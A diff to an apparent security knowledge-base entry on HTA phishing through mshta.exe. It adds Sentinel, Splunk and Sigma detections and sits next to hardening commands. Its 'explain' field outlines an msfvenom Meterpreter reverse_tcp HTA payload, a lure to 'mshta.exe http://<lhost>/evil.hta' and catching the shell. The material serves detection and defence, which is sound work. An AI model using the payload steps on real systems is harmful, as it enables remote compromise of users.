@@ -99,7 +99,57 @@
     ],
     "misconfiguration": "mshta.exe not blocked by application control. Email gateway allows .hta attachments. No ASR rule blocking mshta child process spawning. AMSI not enforced for Internet Explorer scripting engine.",
     "vulnerable_config": "# mshta.exe not in AppLocker/WDAC deny list:\nGet-AppLockerPolicy -Effective | Where-Object {$_.Rules | Select-String 'mshta'}\n# No output → mshta.exe unrestricted\n\n# Email gateway allows .hta attachments:\n# Exchange: Get-TransportRule | Where-Object {$_.AttachmentExtensionMatchesWords -contains 'hta'}\n# No transport rule blocking .hta = attachments delivered",
-    "secure_config": "# Block mshta.exe via WDAC deny rule:\n# Add path rule: deny C:\\Windows\\System32\\mshta.exe\n# Or publisher rule: deny applications published by Microsoft signed with mshta characteristics\n\n# AppLocker EXE rule:\nNew-AppLockerPolicy -RuleType Publisher -FilePath C:\\Windows\\System32\\mshta.exe -Action Deny\n\n# ASR rule (Defender):\nSet-MpPreference -AttackSurfaceReductionRules_Ids 'D4F940AB-401B-4EFC-AADC-AD5F3C50688A' -AttackSurfaceReductionRules_Actions Enabled\n# → Block Office from creating child processes\n\n# Exchange transport rule: block .hta attachments\nNew-TransportRule -Name 'Block HTA Attachments' -AttachmentExtensionMatchesWords 'hta' -RejectMessageEnhancedStatusCode '5.7.1' -RejectMessageReasonText 'HTA files are blocked'"
+    "secure_config": "# Block mshta.exe via WDAC deny rule:\n# Add path rule: deny C:\\Windows\\System32\\mshta.exe\n# Or publisher rule: deny applications published by Microsoft signed with mshta characteristics\n\n# AppLocker EXE rule:\nNew-AppLockerPolicy -RuleType Publisher -FilePath C:\\Windows\\System32\\mshta.exe -Action Deny\n\n# ASR rule (Defender):\nSet-MpPreference -AttackSurfaceReductionRules_Ids 'D4F940AB-401B-4EFC-AADC-AD5F3C50688A' -AttackSurfaceReductionRules_Actions Enabled\n# → Block Office from creating child processes\n\n# Exchange transport rule: block .hta attachments\nNew-TransportRule -Name 'Block HTA Attachments' -AttachmentExtensionMatchesWords 'hta' -RejectMessageEnhancedStatusCode '5.7.1' -RejectMessageReasonText 'HTA files are blocked'",
+    "detections": [
+      {
+        "platform": "sentinel",
+        "name": "HTA - mshta.exe Execution - Sentinel",
+        "logic": "DeviceProcessEvents\n| where FileName =~ \"mshta.exe\" and ProcessCommandLine has_any (\"http\",\"javascript:\",\"vbscript:\")\n| project Timestamp, DeviceName, AccountName, InitiatingProcessFileName, ProcessCommandLine\n| sort by Timestamp desc\n// mshta.exe executing a remote/inline HTA payload",
+        "data_source": "defender-endpoint",
+        "attack": [
+          "T1566.002",
+          "T1218.005",
+          "T1059.001"
+        ],
+        "fidelity": "behavioral",
+        "confidence": "medium"
+      },
+      {
+        "platform": "splunk",
+        "name": "HTA - mshta.exe Execution - Splunk",
+        "logic": "index=sysmon EventCode=1 Image=\"*mshta.exe\"\n| where match(CommandLine, \"(?i)(http|javascript|vbscript)\")\n| table _time, Computer, ParentImage, CommandLine",
+        "data_source": "sysmon",
+        "attack": [
+          "T1566.002",
+          "T1218.005",
+          "T1059.001"
+        ],
+        "fidelity": "behavioral",
+        "confidence": "medium",
+        "log_ids": [
+          "1"
+        ]
+      },
+      {
+        "platform": "sigma",
+        "name": "proc_creation_win_mshta_remote_payload",
+        "logic": "proc_creation_win_mshta_remote_payload",
+        "data_source": "sysmon",
+        "attack": [
+          "T1566.002",
+          "T1218.005",
+          "T1059.001"
+        ],
+        "fidelity": "behavioral",
+        "confidence": "medium"
+      }
+    ],
+    "visibility": {
+      "requires": [
+        "defender-endpoint",
+        "sysmon"
+      ]
+    }
   },
   "explain": "Builds an HTA payload that Windows runs through the trusted mshta.exe:\n  msfvenom -p windows/x64/meterpreter/reverse_tcp   the payload\n  LHOST/LPORT                                       callback details\n  -f hta-psh                                        HTA-with-PowerShell format\n  -o evil.hta                                       output file\nAn .hta is HTML plus script that mshta.exe executes with full local privileges (no browser sandbox); host it, lure the user to 'mshta.exe http://<lhost>/evil.hta', and catch the shell."
 }
